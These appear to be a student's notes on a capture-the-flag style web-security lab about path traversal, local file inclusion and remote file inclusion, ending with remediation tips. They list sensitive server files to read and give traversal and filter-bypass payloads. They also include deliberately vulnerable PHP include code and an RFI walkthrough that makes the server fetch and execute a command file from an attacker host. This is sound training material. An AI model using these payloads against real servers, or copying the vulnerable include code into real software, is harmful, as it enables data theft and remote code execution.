### Table of contents
- [[#Intro]]
- [[#Path Traversal]]
- [[#LFI 1]]
- [[#LFI 2]]
- [[#RFI -- Remote File Inclusion]]
- 

___
### Intro
[[#Table of contents|Back to the top]]

![[Pasted image 20250418150136.png]]

Main issue: input validation -- sanitization, validation

File inclusion can be used to exfiltrate sensitive data or to gain RCE (Remote Command Execution) (if user can access and also write files)

___
### Path Traversal
[[#Table of contents|Back to the top]]

AKA **Directory Traversal** AKA **dot-dot-slash**: attacker can read OS resources (local files on server running app), done by manipulating URL

Path traversal vulnerability: user's input directly passed to function such as ***file_get_contents*** in PHP. Input should be validated and filtered 1st

Common paths to test traversal
- `/etc/issue`: message/ system identification before login prompt
- `/etc/profile`: system-wide 
- `/proc/version`: Linux kernel version
- `/etc/passwd`: all registered users that have access to system
- `/etc/shadow`: info about system's users passwords
- `/root/.bash_history`: root's history commands
- `/var/log/dmessage`: global system messages
- `/var/mail/root`: root's emails
- `/root/.ssh/id_rsa`: SSH keys for root or other user
- `/var/log/apache2/access.log`: accessed requests for Apache web server
- `C:\boot.ini`: boot options for computers with BIOS firmware

___
### LFI #1
[[#Table of contents|Back to the top]]

*Local File Inclusion*

PHP `include`, `require`, `include_once`, `require_once` often contribute to vulnerable web applications

LFI also occurs in ASP, JSP, Node.js

#### Lab #1

1. Web app provides 2 languages, lets user choose (EN/AR)
```php
<?PHP 
	include($_GET["lang"]);
?>
```
$\rightarrow$ `/index.php?lang=EN.php` display English
$\rightarrow$ `/index.php?lang=AR.php` display Arabic

If no input validation $\rightarrow$ possible to access any file on server
$\Rightarrow$ Payload: `/get.php?file=/etc/passwd`

#### Lab #2

2. Developer specified directory
```php
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```
*Include function calls PHP pages in languages directory only via lang parameters*

Without input validation, attacker can manipulate URL, replacing `lang` by `etc/passwd` for instance

When trying `/etc/passwd`, error messages indicates `var/www/html/lab2.php` $\Rightarrow$ 4 `../` to go to the root
$\Rightarrow$ Payload: `http://webapp.thm/index.php?lang=../../../../etc/passwd`

___
### LFI #2
[[#Table of contents|Back to the top]]

LFI #1 was white box: access to source code

LFI #2 is black box: no access to source code $\rightarrow$ error messages are important

#### Lab #3

Error message:
```php
Warning: include(includes/etc/passwd.php) [function.include]: failed to open stream: No such file or directory in /var/www/html/lab3.php on line 26
```
$\rightarrow$ include function looks like `include(languages/etc/passwd.php)` $\Rightarrow$ it appends `etc/passwd` with .php
$\Rightarrow$ use NULL BYTE `%00` to ignore the appending of .php
$\Rightarrow$ Full payload: `../../../../etc/passwd%00`
 
**NB**: doesn't work with PHP **5.3.4** and above

#### Lab #4

Error message:
```php
You are not allowed to see source files!
```

Adding `/.` at the end of the path can bypass filters

$\Rightarrow$ Payload: `../../../../etc/passwd/.`

#### Lab #5

Try `../../../../etc/passwd`

Error message: 
```php
Warning: include(includes/etc/passwd) [function.include]: failed to open stream: No such file or directory in /var/www/html/lab5.php on line 28
```
$\rightarrow$ include function shows no `../` $\rightarrow$ PHP filter deletes `../`
$\Rightarrow$ Payload: `....//....//....//....//etc/passwd`
![[Pasted image 20250424105620.png]]

**Question**: could you make a recursive PHP filter in order to defend against this payload or longer iterations of this payload?

#### Lab #6

Error message:
```php
Access Denied! Allowed files at THM-profile folder only! 
```

$\Rightarrow$ Payload: `THM-profile/../../../../etc/passwd`

___
### RFI -- Remote File Inclusion
[[#Table of contents|Back to the top]]

Include remote file into vulnerable application
`allow_url_fopen` option needs to be `on`

Attacker gain **RCE** (Remote Command Execution) on server
	$\rightarrow$ Sensitive Information Disclosure
	$\rightarrow$ XSS (Cross-site Scripting)
	$\rightarrow$ DoS (Denial of Service)

![[Pasted image 20250424141937.png]]

1. **Inject** malicious URL into web app: `http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt`
2. Web app server sends **`GET`** request to malicious server to fetch file

$\Rightarrow$ Payload: `playground.php?file=http://10.10.163.181/lab6.php?file=THM-profile/tryhackme.txt`

Example:

1. Write script on machine
`cmd.txt`
```php
<?php print exec('hostname'); ?>
```
2. Launch webserver
```shell
sudo python3 -m http.server
```
*will run on port 8000 by default*
Get IP of local machine: `ifconfig` $\rightarrow$ `10.10.199.71`
2. Inject
`http://10.10.163.181/playground.php?file=http://10.10.199.71:8000/cmd.txt`

___
### Remediation
[[#Table of contents|Back to the top]]

1. **Update** everything
2. **Turn off** PHP **errors**
3. **WAF** (Web Application Firewall)
4. Disable unneeded, file inclusion vulnerable PHP **features** (`allow_url_fopen`, `allow_url_include`)
5. Analyze web application, allow only needed **protocols** and PHP **wrappers**
6. **Input validation**
7. **Whitelisting/blacklisting** for file names, locations